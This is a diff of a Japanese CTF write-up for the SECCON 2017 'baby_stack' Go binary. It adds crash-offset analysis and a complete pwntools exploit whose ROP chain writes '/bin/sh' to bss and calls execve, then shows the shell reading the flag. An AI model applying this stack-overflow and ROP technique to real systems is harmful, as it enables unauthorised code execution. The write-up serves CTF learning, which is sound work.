@@ -34,8 +34,8 @@ mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ checksec baby_stack-7b078c99bb96de6e5ef
 ** 方針
 この問題では、実行ファイルのみ配布され、問題のソースコードが配布されていない。
 このため、問題を解くために以下の手順で脆弱性の調査を行う。
-1. 配布された実行ファイルを動作させ、動的解析
-2. 配布された実行ファイルを逆アセンブルし、静的解析
+1. 配布された実行ファイルを動作させ、脆弱性を特定
+2. 特定した脆弱性を利用してシェルの起動
 
 ** 1. 配布された実行ファイルの動的解析
 *** 実行ファイルの動作の確認   
@@ -272,26 +272,84 @@ gef➤
 
      次に、RIPの書き換えを行ったのち、シェルを起動する方法を考える。
 
+
+     #+begin_example
+gef➤  pattern create 0x200
+[+] Generating a pattern of 512 bytes (n=8)
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
+[+] Saved as '$_gef0'
+     #+end_example
+
+     #+begin_example
+gef➤
+runtime: out of memory: cannot allocate 7089054359331405824-byte block (1048576 in use)
+fatal error: out of memory
+
+runtime stack:
+runtime.throw(0x50c400, 0xd)
+        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
+runtime.largeAlloc(0x6261616161616162, 0x3, 0x0)
+        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
+runtime.mallocgc.func3()
+        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
+runtime.systemstack(0x5a0300)
+        /usr/lib/go-1.6/src/runtime/asm_amd64.s:291 +0x79
+runtime.mstart()
+        /usr/lib/go-1.6/src/runtime/proc.go:1051
+
+goroutine 1 [running]:
+runtime.systemstack_switch()
+        /usr/lib/go-1.6/src/runtime/asm_amd64.s:245 fp=0xc820051b60 sp=0xc820051b58
+runtime.mallocgc(0x6261616161616162, 0x0, 0xc800000003, 0xc8200a8000)
+        /usr/lib/go-1.6/src/runtime/malloc.go:665 +0x9eb fp=0xc820051c38 sp=0xc820051b60
+runtime.rawstring(0x6261616161616162, 0x0, 0x0, 0x0, 0x0, 0x0)
+        /usr/lib/go-1.6/src/runtime/string.go:284 +0x70 fp=0xc820051c80 sp=0xc820051c38
+runtime.rawstringtmp(0x0, 0x6261616161616162, 0x0, 0x0, 0x0, 0x0, 0x0)
+        /usr/lib/go-1.6/src/runtime/string.go:111 +0xb7 fp=0xc820051cb8 sp=0xc820051c80
+runtime.slicebytetostring(0x0, 0x626161616161617a, 0x6261616161616162, 0x6261616161616163, 0x0, 0x0)
+        /usr/lib/go-1.6/src/runtime/string.go:93 +0x6f fp=0xc820051d50 sp=0xc820051cb8
+main.main()
+        /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x2f8 fp=0xc820051f50 sp=0xc820051d50
+[LWP 38643 exited]
+[LWP 38642 exited]
+[LWP 38641 exited]
+[LWP 38640 exited]
+[Inferior 1 (process 38636) exited with code 02]
+     #+end_example
+
+     上記のエラーを見てみると、 ~0x6261616161616162~、~0x6261616161616163~ 、 および ~0x626161616161617a~ のパターンの箇所が原因でエラーが発生していると考えられる。
+     そこで、これらのパターンのオフセットを求めてみる。
+     #+begin_example
+gef➤  pattern search 0x6261616161616162
+[+] Searching for '0x6261616161616162'
+[+] Found at offset 208 (little-endian search) likely
+[+] Found at offset 208 (big-endian search)
+gef➤  pattern search 0x6261616161616163
+[+] Searching for '0x6261616161616163'
+[+] Found at offset 216 (little-endian search) likely
+[+] Found at offset 408 (big-endian search)
+gef➤  pattern search 0x626161616161617a
+[+] Searching for '0x626161616161617a'
+[+] Found at offset 200 (little-endian search) likely
+     #+end_example
+     すると、これらのオフセットは208(0xd0)番目、216(0xd8)番目、200(0xc8)番目にあたることがわかる。
+     そこで、エラーの原因と考えられる箇所には、bss領域のアドレスが格納されるようにしておく。
      
 ** 2. 配布された実行ファイルの静的解析
 
 ** solver
-
-   途中まで
    #+begin_src python
 from pwn import *
 
 filename = './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
 chall = ELF(filename)
 
-# docker-compose up
-# conn = remote('localhost', 9001)
-conn = process(filename)
+# socat TCP-LISTEN:8000,reuseaddr,fork EXEC:"./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8"
+conn = remote('localhost', 8000)
+# conn = process(filename)
 
 # ROP Gadgets
-sh_str = 0x4d1f72
 bss_addr = 0x000000000058e000
-
 hoge_str = 0x000000c8200a2000
 
 ## 0x00000000004026da: syscall;
@@ -299,6 +357,9 @@ syscall = 0x00000000004026da
 
 ## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;
 pop_rdi = 0x0000000000470931
+
+## 0x0000000000456499: mov qword ptr [rdi], rax; ret;
+mov_rdi_rax = 0x0000000000456499
 
 ## 0x000000000046defd: pop rsi; ret;
 pop_rsi = 0x000000000046defd
@@ -309,47 +370,75 @@ pop_rax = 0x00000000004016ea
 ## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;
 pop_rdx = 0x0000000000448145
 
+## static string
+please_ptr = 0x521f00
+please_size = 0x6
 
 # Input name (First input)
 buf1 = b"hoge"
 conn.sendline(buf1)
 
-# Input msg (Second input)
-# 0x000000c820047db0│+0x0060: 0x0000000061677566 ("fuga"?)
-# ...
-# 0x000000c820047e98│+0x0148: <runtime.newobject+66> mov rbx, QWORD PTR [rsp+0x18]
-# 0x000000c820051f48│+0x0200: 0x0000000000429ef0  →  <runtime.main+688> mov ebx, DWORD PTR [rip+0x1903c2]        # 0x5ba2b8 <runtime.panicking>
+# Inpu msg (Second input)
+## recover name
+buf2 = b'a'*0x68
+buf2 += p64(please_ptr)
+buf2 += p64(please_size)
 
-# buf2 = b'a'*0x20
-buf2 = b'a'*(0x88-0x60)
-buf2 += p64(hoge_str)
-buf2 += b'a'*(0xc8-0x60-len(buf2))
-buf2 += p64(hoge_str)
-buf2 += b'a'*(0x128-0x60-len(buf2))
-buf2 += p64(hoge_str)
-# buf2 += b'a'*(0x148-0x60-len(buf2))
-# buf2 += p64(hoge_str)
-buf2 += b'a'*(0x1f8-0x60-len(buf2))
+## recover msg
+buf2 += b'a'*(0xc8-len(buf2))
+buf2 += p64(please_ptr)
+buf2 += p64(please_size)
 
-# buf2 = b'\x00'*(0x1f8-0x60)
+buf2 += b'a'*(0x198-len(buf2))
 
 # ROP
+## rdx = 0
 buf2 += p64(pop_rdx)
-buf2 += p64(0)
+buf2 += p64(0x0)
 buf2 += b'a'*0x38
+
+## rsi = 0
 buf2 += p64(pop_rsi)
-buf2 += p64(0)
-buf2 += p64(pop_rdi)
-buf2 += p64(sh_str)
+buf2 += p64(0x0)
+
+## rdi = "/bin/sh"
 buf2 += p64(pop_rax)
-buf2 += p64(59)
+buf2 += p64(bss_addr) # initialize rax with bss_addr
+buf2 += p64(pop_rdi)
+buf2 += p64(bss_addr)
+buf2 += p64(pop_rax)
+buf2 += b"/bin/sh\x00"
+buf2 += p64(mov_rdi_rax)
+
+## rax = 59
+buf2 += p64(pop_rax)
+buf2 += p64(59)      # execve
+
+## execve("/bin/sh", 0, 0)
 buf2 += p64(syscall)
-
 conn.sendline(buf2)
-
 conn.interactive()
    #+end_src
-
-*** Flag
-    ~SECCON{---}~
+   
+*** 実行結果
+   #+begin_example
+mc4nf@mc4nf:~/ctf/secconctf_2017/pwn/baby_stack$ python solve.py
+[*] '/home/mc4nf/ctf/secconctf_2017/pwn/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to localhost on port 8000: Done
+[*] Switching to interactive mode
+Please tell me your name >> Give me your message >> Thank you, Please!
+msg : Please
+$ ls
+baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8
+flag.txt
+$ cat flag.txt
+SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}
+   #+end_example
+   
+*** ~SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}~
    
